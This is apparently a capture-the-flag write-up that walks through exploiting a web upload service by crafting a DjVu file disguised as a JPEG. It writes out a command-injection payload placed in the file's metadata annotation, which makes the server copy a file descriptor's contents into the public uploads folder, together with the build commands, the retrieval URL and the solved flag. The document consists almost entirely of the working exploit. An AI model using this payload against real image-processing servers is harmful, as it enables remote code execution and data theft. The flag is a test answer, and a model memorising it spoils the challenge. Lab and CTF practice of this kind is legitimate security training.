create payload.txt 
```
(metadata "\c${system('cat /proc/15/fd/3 > /var/www/html/uploads/flag3.txt')};")
```

create dummy container
```
echo "P1 1 1 0" > dummy.pbm
cjb2 dummy.pbm dummy.djvu
djvumake exploit.djvu INFO=0,0 BGjp=/dev/null ANTa=payload.txt
mv exploit.djvu exploit.jpg
```

then upload to the website and http://target-ip:9090/uploads/flag3.txt to get the hidden flag


Flag: PCTF{hidden_in_depths}

Solved by: ha1qal